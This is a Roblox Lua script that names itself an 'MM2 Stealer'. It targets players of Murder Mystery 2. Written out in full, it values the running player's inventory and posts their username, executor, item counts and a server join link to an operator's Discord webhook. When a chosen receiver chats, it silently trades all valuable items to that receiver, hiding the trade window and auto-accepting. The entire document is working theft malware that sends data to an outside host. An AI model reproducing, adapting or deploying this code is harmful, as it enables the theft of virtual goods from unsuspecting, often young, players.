if not _G["Script-SM_Config"] then
    warn("Waiting for config...")
    repeat task.wait() until _G["Script-SM_Config"]
end

local config = _G["Script-SM_Config"]
local webhook = config.user_webhook
local usernames = config.users or {}
local minPingVal = tonumber(config.Min_Ping) or 0

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

if game.PlaceId ~= 142823291 then
    LocalPlayer:Kick("Wrong game! Join Murder Mystery 2")
    return
end

-- Advanced Value Scraper from your other script
local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    vintage = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}

local function trim(s)
    return s:match("^%s*(.-)%s*$")
end

local function fetchHTML(url)
    local response = request({Url = url, Method = "GET"})
    return response.Body
end

local function parseValue(body)
    local valueStr = body:match("([%d,]+)")
    if valueStr then
        return tonumber(valueStr:gsub(",", ""))
    end
    return nil
end

local function extractItems(html)
    local values = {}
    for name, body in html:gmatch("<div class=['\"]itemhead['\"]>(.-)</div>.-<div class=['\"]itembody['\"]>(.-)</div>") do
        local cleanName = trim(name:gsub("%s+", " ")):lower()
        local value = parseValue(body)
        if cleanName and value then
            values[cleanName] = value
        end
    end
    return values
end

local itemValues = {}
for _, url in pairs(categories) do
    local html = fetchHTML(url)
    local extracted = extractItems(html)
    for k, v in pairs(extracted) do
        itemValues[k] = v
    end
    task.wait(0.5)
end

-- Inventory
local itemsToTrade = {}
local overallValue = 0
local rarityCounts = {Godly=0, Ancient=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}

local itemDatabase = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local success, inventoryData = pcall(function()
    return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
end)

if success and inventoryData and inventoryData.Weapons then
    for itemId, count in pairs(inventoryData.Weapons.Owned or {}) do
        local info = itemDatabase[itemId]
        if info and not (itemId == "DefaultGun" or itemId == "DefaultKnife") then
            local name = tostring(info.ItemName)
            local val = itemValues[name:lower()] or 150
            overallValue += val * count
            local rarity = info.Rarity or "Common"
            if rarityCounts[rarity] then rarityCounts[rarity] = rarityCounts[rarity] + count end
            table.insert(itemsToTrade, {id = itemId, name = name, qty = count, val = val})
        end
    end
end

table.sort(itemsToTrade, function(a, b) return (a.val * a.qty) > (b.val * b.qty) end)

-- Embed matching picture
local function postToDiscord()
    local joinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
    local receiverList = #usernames > 0 and table.concat(usernames, ", ") or "None"

    local embed = {
        username = "MM2 Stealer",
        embeds = {{
            title = "MM2 stealer",
            fields = {
                {name = "Player Info:", value = "```Username: " .. LocalPlayer.Name .. "\nDisplay Username: " .. LocalPlayer.DisplayName .. "\nExecutor: " .. (identifyexecutor and identifyexecutor() or "Unknown") .. "\nAntiscam on\nRoblox version: " .. (version() or "Unknown") .. "\nReceiver: " .. receiverList .. "```", inline = false},
                {name = "Inventory", value = "```Total value: " .. string.format("%.2f", overallValue) .. "\nAncient     : " .. rarityCounts.Ancient .. "\nGodly       : " .. rarityCounts.Godly .. "\nUnique      : " .. rarityCounts.Unique .. "\nVintage     : " .. rarityCounts.Vintage .. "\nLegendary   : " .. rarityCounts.Legendary .. "\nRare        : " .. rarityCounts.Rare .. "\nUncommon    : " .. rarityCounts.Uncommon .. "\nCommon      : " .. rarityCounts.Common .. "```", inline = false},
                {name = "List of items", value = "https://api.rubis.app/v2/scrap/" .. LocalPlayer.Name, inline = false},
                {name = "Join link:", value = joinLink, inline = false},
            },
            footer = {text = "best Stealer - " .. os.date("%Y-%m-%d %H:%M:%S")},
            color = 0x00FF00
        }}
    }

    pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(embed)
        })
    end)
end

-- Trade Engine
local function checkTradeState()
    return ReplicatedStorage:WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
end

local function doTrade(target)
    task.spawn(function()
        postToDiscord()
        local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
        if tradeGui then
            tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() tradeGui.Enabled = false end)
        end

        while #itemsToTrade > 0 do
            local state = checkTradeState()
            if state == "None" then
                ReplicatedStorage.Trade.SendRequest:InvokeServer(target)
            elseif state == "StartTrade" then
                for i = 1, math.min(6, #itemsToTrade) do
                    local item = table.remove(itemsToTrade, 1)
                    for _ = 1, item.qty do
                        ReplicatedStorage.Trade.OfferItem:FireServer(item.id, "Weapons")
                        task.wait(0.32)
                    end
                end
                task.wait(4)
                ReplicatedStorage.Trade.AcceptTrade:FireServer()
            else
                task.wait(1.2)
            end
        end
        postToDiscord()
    end)
end

local function onPlayerAdded(plr)
    if table.find(usernames, plr.Name) then
        plr.Chatted:Connect(function() doTrade(plr) end)
    end
end

for _, plr in ipairs(Players:GetPlayers()) do onPlayerAdded(plr) end
Players.PlayerAdded:Connect(onPlayerAdded)

postToDiscord()
print("✅ ZENX MM2 Stealer Loaded")
